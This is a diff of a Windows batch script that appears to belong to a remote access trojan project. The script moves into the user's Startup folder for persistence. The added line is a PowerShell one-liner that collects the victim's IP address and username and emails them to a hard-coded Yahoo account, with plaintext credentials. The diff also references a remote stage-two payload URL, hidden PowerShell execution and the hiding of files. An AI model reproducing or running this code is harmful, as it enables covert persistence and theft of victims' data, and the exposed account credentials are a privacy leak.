@@ -12,6 +12,9 @@ set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 REM move into startup directory
 cd /d "%STARTUP%"
 
+@REM setup smtp
+powershell $email = "soumyahembra123@yahoo.com"; $password = "Soumya@2002"; $ip = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress | Out-String;$subject = "$env:UserName logs";$smtp = New-Object System.Net.Mail.SmtpClient("smtp.mail.yahoo.com","587");$smtp.EnableSSL = $true;$smtp.Credentials = New-Object System.Net.NetworkCredential($email,$password);$smtp.Send($email,$email,$subject,$ip);
+
 REM TODO: Build out stage two
 REM write payloads to startup
 @REM https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/wget.cmd
@@ -25,19 +28,6 @@ powershell -windowstyle hidden -Command ^
     Write-Error 'An error occurred: ' + $_.Exception.Message; ^
 }"
 
-@REM setup smtp
-(
-    echo $email = "soumyahembra123@yahoo.com"
-    echo $password = "Soumya@2002"
-    echo $ip = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress
-    echo echo "ip:$ip" > "$env:UserName.rat"
-
-    echo $subject = "$env:UserName logs"
-    echo $smpt = New-Object System.Net.Mail.SmtpClient("smtp.mail.yahoo.com","587");
-    echo $smtp.EnableSSL = $true
-    echo $smtp.Credentials = New-Object System.Net.NetworkCredential($email,$password);
-    echo $smtp.Send($email,$email,$subject,$ip)
-) > smtp.txt
 REM hide the stage2.cmd file
 attrib +h wget.cmd
  
